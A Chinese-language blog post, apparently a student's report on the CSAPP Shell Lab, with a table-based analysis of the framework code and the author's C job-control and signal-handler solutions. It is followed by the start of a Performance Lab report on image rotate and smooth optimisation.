<p>实验提供了tshref.out作为16个trace file在tshref程序下的参考输出。为了方便比较，写了一个小的（可能会有很多错误）的shell脚本gather_output.sh用来生成这些trace file在tsh下的输出，脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin bash</span></div><div class="line"></div><div class="line">output_file=tsh.out</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">""</span> &gt; tsh.out</div><div class="line"></div><div class="line"><span class="built_in">echo</span> -e <span class="string">"\n"</span> &gt;&gt; tsh.out</div><div class="line"></div><div class="line"><span class="keyword">for</span> trace_file <span class="keyword">in</span> ./*.txt</div><div class="line"><span class="keyword">do</span></div><div class="line">    <span class="built_in">echo</span> -e <span class="string">"`./sdriver.pl -t <span class="variable">$trace_file</span> -s ./tsh -a "</span>-p<span class="string">"`"</span> &gt;&gt; tsh.out</div><div class="line"><span class="keyword">done</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> -e <span class="string">"\n"</span> &gt;&gt; tsh.out</div></pre></td></tr></table></figure></p>
<h2 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h2><blockquote>
<p>最早在做这个实验的时候一直没有什么头绪，即使已经参考了实验讲义，使用trace file来指导编程（trace file的难度自简单到复杂）。后来还是先好好的阅读了一遍给出的框架源代码，整理如下。</p>
</blockquote>
<h3 id="框架代码分析"><a href="#框架代码分析" class="headerlink" title="框架代码分析"></a>框架代码分析</h3><h4 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h4><table>
<thead>
<tr>
<th>宏</th>
<th>描述</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr>
<td>MAXLINE</td>
<td>定义了命令行1行允许的最大字符数</td>
<td>1024</td>
</tr>
<tr>
<td>MAXARGS</td>
<td>定义了命令行所允许的最大参数个数</td>
<td>128</td>
</tr>
<tr>
<td>MAXJOBS</td>
<td>定义了命令行同一时间允许的最多任务个数</td>
<td>16</td>
</tr>
<tr>
<td>MAXJID</td>
<td>定义了最大的任务ID</td>
<td>1&lt;&lt;16</td>
</tr>
<tr>
<td>UNDEF</td>
<td>未定义的状态</td>
<td>0</td>
</tr>
<tr>
<td>FG</td>
<td>任务运行在前台</td>
<td>1</td>
</tr>
<tr>
<td>BG</td>
<td>任务运行在后台</td>
<td>2</td>
</tr>
<tr>
<td>ST</td>
<td>任务停止</td>
<td>3</td>
</tr>
</tbody>
</table>
<blockquote>
<p>允许如下的状态转换<br>FG -&gt; ST : ctrl-z<br>ST -&gt; FG : fg命令<br>BG -&gt; FG : fg命令<br>ST -&gt; BG : bg命令</p>
</blockquote>
<h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> &#123;</span>              <span class="comment">//任务</span></div><div class="line">    <span class="keyword">pid_t</span> pid;              <span class="comment">//任务的PID</span></div><div class="line">    <span class="keyword">int</span> jid;                <span class="comment">//任务JID [1, 2, ...]</span></div><div class="line">    <span class="keyword">int</span> state;              <span class="comment">//状态 - 包括UNDEF, BG, FG, ST</span></div><div class="line">    <span class="keyword">char</span> cmdline[MAXLINE];  <span class="comment">//对应的命令行输入</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><table>
<thead>
<tr>
<th>变量名</th>
<th>变量类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>environ</td>
<td>char **</td>
<td>定义在libc中 环境变量</td>
</tr>
<tr>
<td>prompt</td>
<td>char[]</td>
<td>命令行提示符</td>
</tr>
<tr>
<td>verbose</td>
<td>int</td>
<td>为1时输出额外信息</td>
</tr>
<tr>
<td>nextjid</td>
<td>int</td>
<td>下一个待分配的JID</td>
</tr>
<tr>
<td>subf</td>
<td>char[MAXLINE]</td>
<td>用于生成sprintf信息</td>
</tr>
<tr>
<td>jobs</td>
<td>struct job_t [MAXJOBS]</td>
<td>全局任务表</td>
</tr>
</tbody>
</table>
<h4 id="函数列表"><a href="#函数列表" class="headerlink" title="函数列表"></a>函数列表</h4><table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>parseline</td>
<td>int parseline(const char <em>cmdline, char *</em>argv)</td>
<td>接收命令行输入以及参数列表，解析输入并且将解析到的参数存入参数列表，并且判断该命令是否以’&amp;’结尾，是则返回1，否则返回0</td>
</tr>
<tr>
<td>sigquit_handler</td>
<td>void sigquit_handler(int sig)</td>
<td>SIGQUIT的信号处理函数</td>
</tr>
<tr>
<td>clearjob</td>
<td>void clearjob(struct job_t *job)</td>
<td>将对应任务的PID，JID清零，状态设置为UNDEF，并且将命令行输入清空</td>
</tr>
<tr>
<td>initjobs</td>
<td>void initjobs(struct job_t *jobs)</td>
<td>将任务列表中的所有任务清空</td>
</tr>
<tr>
<td>maxjid</td>
<td>int maxjid(struct job_t *jobs)</td>
<td>返回任务列表中的最大JID</td>
</tr>
<tr>
<td>addjob</td>
<td>int addjob(struct job_t <em>jobs, pid_t pid, int state, char </em>cmdline)</td>
<td>将给定任务添加至任务列表，如果nextjid超过了MAXJOBS，则将其重置为1</td>
</tr>
<tr>
<td>deletejob</td>
<td>int deletejob(struct job_t *jobs, pid_t pid)</td>
<td>将对应任务从任务列表中删除，并将nextjid自增1</td>
</tr>
<tr>
<td>fgpid</td>
<td>pid_t fgpid(struct job_t *jobs)</td>
<td>返回当前前台任务的PID，如果没有则返回0</td>
</tr>
<tr>
<td>getjobpid</td>
<td>struct job_t <em>getjobpid(struct job_t </em>jobs, pid_t pid)</td>
<td>按照pid查询任务 如果没有则返回NULL</td>
</tr>
<tr>
<td>getjobjid</td>
<td>struct job_t <em>getjobjid(struct job_t </em>jobs, int jid)</td>
<td>按照jid查询任务 如果没有则返回NULL</td>
</tr>
<tr>
<td>pid2jid</td>
<td>int pid2jid(pid_t pid)</td>
<td>根据pid返回其jid，没有则返回0</td>
</tr>
<tr>
<td>listjobs</td>
<td>void listjobs(struct job_t *jobs)</td>
<td>打印任务队列</td>
</tr>
<tr>
<td>usage</td>
<td>void usage(void)</td>
<td>打印帮助信息</td>
</tr>
<tr>
<td>unix_error</td>
<td>void unix_error(char *msg)</td>
<td>打印系统级错误信息并结束进程</td>
</tr>
<tr>
<td>app_error</td>
<td>void app_error(char *msg)</td>
<td>打印应用级错误信息并结束进程</td>
</tr>
<tr>
<td>Signal</td>
<td>handler_t <em>Signal(int signum, handler_t </em>handler)</td>
<td>signal的包装函数</td>
</tr>
<tr>
<td>eval</td>
<td>void eval(char *cmdline)</td>
<td>求值函数</td>
</tr>
<tr>
<td>builtin_cmd</td>
<td>int builtin_cmd(char **argv)</td>
<td>处理内建函数</td>
</tr>
<tr>
<td>do_bgfg</td>
<td>void do_bgfg(char **argv)</td>
<td>实现内建的bg和fg</td>
</tr>
<tr>
<td>waitfg</td>
<td>void waitfg(pid_t pid)</td>
<td>等待前台的任务完成</td>
</tr>
<tr>
<td>sigchld_handler</td>
<td>void sigchld_handler(int sig)</td>
<td>SIGCHLD的信号处理程序</td>
</tr>
<tr>
<td>sigtstp_handler</td>
<td>void sigtstp_handler(int sig)</td>
<td>SIGTSTP的信号处理程序</td>
</tr>
<tr>
<td>sitint_handler</td>
<td>void sigint_handler(int sig)</td>
<td>SIGINT的信号处理程序</td>
</tr>
</tbody>
</table>
<h2 id="实验答案"><a href="#实验答案" class="headerlink" title="实验答案"></a>实验答案</h2><blockquote>
<p>为了简化篇幅，这里只附上几个相关的函数，已实现函数以及包装函数等就不一并附上。如有需要可以去GitHub中查看。</p>
</blockquote>
<p>实验答案为我自己的实验解法，很可能不是最优解法，请不要直接抄袭。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> * argv[MAXARGS];</div><div class="line">    <span class="keyword">char</span> buf[MAXLINE];</div><div class="line">    <span class="keyword">int</span> bg; <span class="comment">/* if run in background */</span></div><div class="line">    <span class="keyword">pid_t</span> pid;</div><div class="line"></div><div class="line">    <span class="keyword">sigset_t</span> mask_all, mask_chld, prev_chld;</div><div class="line"></div><div class="line">    <span class="comment">/*initialize signal sets*/</span></div><div class="line">    Sigfillset(&amp;mask_all);</div><div class="line">    Sigemptyset(&amp;mask_chld);</div><div class="line">    Sigaddset(&amp;mask_chld, SIGCHLD);</div><div class="line"></div><div class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</div><div class="line">    bg = parseline(buf, argv); <span class="comment">/* parse the command line */</span></div><div class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>) &#123;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125; <span class="comment">/* handles if there is empty input */</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123; <span class="comment">/* if the command line is builtin command */</span></div><div class="line">        Sigprocmask(SIG_BLOCK, &amp;mask_chld, &amp;prev_chld); <span class="comment">/* block SIGCHLD to avoid potential race between addjob and deletejob */</span></div><div class="line">        <span class="keyword">if</span> ((pid = Fork()) == <span class="number">0</span>) &#123;</div><div class="line">            Setpgid(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* give the child process a new group id to handle SIGINT correctly */</span></div><div class="line">            Sigprocmask(SIG_SETMASK, &amp;prev_chld, <span class="literal">NULL</span>); <span class="comment">/* unblock SIGCHLD */</span></div><div class="line">            Execve(argv[<span class="number">0</span>], argv, environ);</div><div class="line">        &#125;</div><div class="line">        Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>); <span class="comment">/* mask all signals to avoid potential races */</span></div><div class="line">        addjob(jobs, pid, bg + <span class="number">1</span>, cmdline); <span class="comment">/* add job to joblist */</span></div><div class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_chld, <span class="literal">NULL</span>);</div><div class="line">        <span class="keyword">if</span> (!bg) &#123; <span class="comment">/* if the process should be exeuted in foreground */</span></div><div class="line">            waitfg(pid); <span class="comment">/* fg wait explictly */</span></div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, pid2jid(pid), pid, cmdline); <span class="comment">/* bg print message*/</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">/* handles the builtin command in current context */</span></div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"quit"</span>)) &#123;</div><div class="line">        <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* quit: exit directly*/</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"jobs"</span>)) &#123;</div><div class="line">        listjobs(jobs); <span class="comment">/* jobs: print the current job list */</span></div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) &#123;</div><div class="line">        do_bgfg(argv); <span class="comment">/* bg|fg: handles in function do_bgfg */</span></div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"&amp;"</span>)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">/* returns 1 for empty &amp; */</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> number = <span class="number">0</span>; <span class="comment">/* used to store the converted number */</span></div><div class="line">    <span class="keyword">char</span> * ptr = argv[<span class="number">1</span>]; <span class="comment">/* get the pointer to argument 1 */</span></div><div class="line">    <span class="keyword">char</span> * endptr = <span class="literal">NULL</span>; <span class="comment">/* used for error handling */</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">job</span> = <span class="title">NULL</span>;</span> <span class="comment">/* used to store job pointer */</span></div><div class="line">    <span class="keyword">if</span> (!argv[<span class="number">1</span>]) &#123; <span class="comment">/* returns if missing argument */</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (*ptr == <span class="string">'%'</span>) &#123; <span class="comment">/* if argument 1 is job ID */</span></div><div class="line">        ptr++; <span class="comment">/* adjust pointer */</span></div><div class="line">        number = strtol(ptr, &amp;endptr, <span class="number">10</span>);</div><div class="line">        <span class="keyword">if</span> (ptr == endptr) &#123; <span class="comment">/* handles convert error */</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        job = getjobjid(jobs, number); <span class="comment">/* get the job */</span></div><div class="line">        <span class="keyword">if</span> (!job) &#123;<span class="comment">/* handles if there is no such job */</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%%%d: No such job\n"</span>, number);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">/* if argument 1 is pid */</span></div><div class="line">        number = strtol(ptr, &amp;endptr, <span class="number">10</span>);</div><div class="line">        <span class="keyword">if</span> (ptr == endptr) &#123; <span class="comment">/* handles convert error */</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        job = getjobpid(jobs, (<span class="keyword">pid_t</span>)number); <span class="comment">/* get the job */</span></div><div class="line">        <span class="keyword">if</span> (!job) &#123;<span class="comment">/* handles if there is no such job */</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"(%d): No such process\n"</span>, number);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* change process state and update the job list*/</span></div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>)) &#123; <span class="comment">/*bg: turns ST to BG, send SIGCONT */</span></div><div class="line">        <span class="keyword">if</span>(job-&gt;state == ST) &#123;</div><div class="line">            Kill(-(job-&gt;pid), SIGCONT);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</div><div class="line">            job-&gt;state = BG;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) &#123;<span class="comment">/* fg: turns ST/BG to FG, sent SIGCONT */</span></div><div class="line">        <span class="keyword">if</span>(job-&gt;state == ST) &#123;</div><div class="line">            Kill(-(job-&gt;pid), SIGCONT);</div><div class="line">            job-&gt;state = BG;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(job-&gt;state == BG) &#123;</div><div class="line">            job-&gt;state = FG;</div><div class="line">            waitfg(job-&gt;pid);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span>(fgpid(jobs)) &#123; <span class="comment">/* handles all zombie processes in signal handler */</span></div><div class="line">        sleep(<span class="number">0.01</span>); <span class="comment">/* busy loop only */</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> olderrno = errno; <span class="comment">/* store old errno */</span></div><div class="line">    <span class="keyword">int</span> status; <span class="comment">/* used to trace pid's status */</span></div><div class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</div><div class="line">    <span class="keyword">pid_t</span> pid;</div><div class="line"></div><div class="line">    Sigfillset(&amp;mask_all);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>((pid = Waitpid(<span class="number">-1</span>, &amp;status, WUNTRACED | WNOHANG)) &gt; <span class="number">0</span>) &#123; <span class="comment">/* waitpid without waiting(WNOHANG) */</span></div><div class="line">        <span class="keyword">if</span> (WIFSTOPPED(status) &amp;&amp; (WSTOPSIG(status) == SIGTSTP || WSTOPSIG(status) == SIGSTOP)) &#123; <span class="comment">/* if the process is stopped */</span></div><div class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></div><div class="line">            <span class="keyword">if</span> (job &amp;&amp; job-&gt;state != ST) &#123; <span class="comment">/* if the stop signal hasn't been catched */</span></div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>, pid2jid(pid), pid, WSTOPSIG(status));</div><div class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">stpjob</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></div><div class="line">                stpjob-&gt;state = ST;<span class="comment">/* handles here */</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (WIFSIGNALED(status) &amp;&amp; WTERMSIG(status) == SIGINT) &#123; <span class="comment">/* it the terminate signal hasn't been catched */</span></div><div class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></div><div class="line">            <span class="keyword">if</span> (job) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, pid2jid(pid), pid, WTERMSIG(status));</div><div class="line">                <span class="comment">/* handles here */</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (WIFEXITED(status) || WIFSIGNALED(status)) &#123;</div><div class="line">            Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</div><div class="line">            deletejob(jobs, pid);</div><div class="line">            Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</div><div class="line">        &#125;<span class="comment">/* remove the job in job list accordingly */</span></div><div class="line">    &#125;</div><div class="line">    errno = olderrno;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> olderrno = errno; <span class="comment">/* store old errno */</span></div><div class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</div><div class="line">    Sigfillset(&amp;mask_all);</div><div class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); <span class="comment">/* block all signal in case the race between SIGINT and SIGCHLD */</span></div><div class="line"></div><div class="line">    <span class="keyword">pid_t</span> pid;</div><div class="line">    pid = fgpid(jobs);</div><div class="line">    Kill(-pid, SIGINT); <span class="comment">/* kill processes in fg job's process group */</span></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, pid2jid(pid), pid, sig); <span class="comment">/* print the message */</span></div><div class="line"></div><div class="line">    deletejob(jobs, pid); <span class="comment">/* delete job in joblist */</span></div><div class="line"></div><div class="line">    Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">    errno = olderrno;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> olderrno = errno; <span class="comment">/* store old errno */</span></div><div class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</div><div class="line">    Sigfillset(&amp;mask_all);</div><div class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); <span class="comment">/* block all signal in case the race between SIGTSTP and SIGCHLD */</span></div><div class="line"></div><div class="line">    <span class="keyword">pid_t</span> pid;</div><div class="line">    pid = fgpid(jobs);</div><div class="line">    Kill(-pid, SIGTSTP); <span class="comment">/* send SIGTSTP to fg job's process group */</span></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>, pid2jid(pid), pid, sig); <span class="comment">/* print the message */</span></div><div class="line"></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">stpjob</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></div><div class="line">    stpjob-&gt;state = ST; <span class="comment">/* modify the job list */</span></div><div class="line"></div><div class="line">    Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">    errno = olderrno;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>总的来说不难的一个实验，关键在于要先理解整个框架中的代码，然后根据trace file渐进地完成程序。需要注意的地方实验讲义中的提示以及书本中都已经给出，这里不再赘述。需要强调的是SIGCHLD的信号处理程序需要处理未捕获的SIGTSTP和SIGINT信号。此外SIGINT/SIGTSTP和SIGCHLD的信号处理程序之间可能会有潜在的导致错误的冲突。（信号处理程序是可以被其他信号中断的，可以见trace16.txt）</p>
<p>此外，handler中的printf是异步不安全的，不推荐使用。以及书本中虽然使用了sigsuspend来实行同步，但是为了简化程序，根据实验讲义的提示，使用了忙循环处理前台等待，并且将回收僵死进程任务交给了sigchld_handler。这些都是本次实验中不足和可以修改的地方。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/08/01/深入理解计算机系统ShellLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/07/20/深入理解计算机系统PerformanceLab实验报告/">
                            深入理解计算机系统PerformanceLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-07-20T01:23:51+08:00">
	
		    7月 20, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/PerformanceLab" target="_blank" rel="external">GitHub</a>上</p>
<blockquote>
<p>由于Cache Lab的Part B的64 × 64的矩阵一直拿不到满分，索性放在了一边，先从老的Performance Lab开始做起。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Performance Lab - Code Optimization是有关性能优化的实验，对应于书本的第5章：优化程序性能和第6章：存储器层次结构。主要提供了利用书本所学的知识优化代码的机会。</p>
<p>本实验主要分为两个部分，每个部分分别对于一个简单的图像处理函数进行优化。第一个部分所优化的函数旋转(rotate)对于缓存更加敏感，而第二个部分所优化的函数平滑(smooth)则属于计算密集型函数。对它们优化的侧重是有所不同的。</p>
<p>本实验的具体介绍见<a href="http://csapp.cs.cmu.edu/3e/perflab.pdf" target="_blank" rel="external">实验讲义</a>。</p>
<h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本实验中，我们将实现两个图像处理函数——旋转和平滑。</p>
<p>我们将一张图片抽象地表示为一个二维矩阵M，M(i, j)代表了M中第i行第j列的像素的值，该像素值被定义为红色、绿色、蓝色（RGB）的值的三元组。在本实验中，我们只考虑正方形的图片。下标遵循C语言风格，从0到N-1。</p>
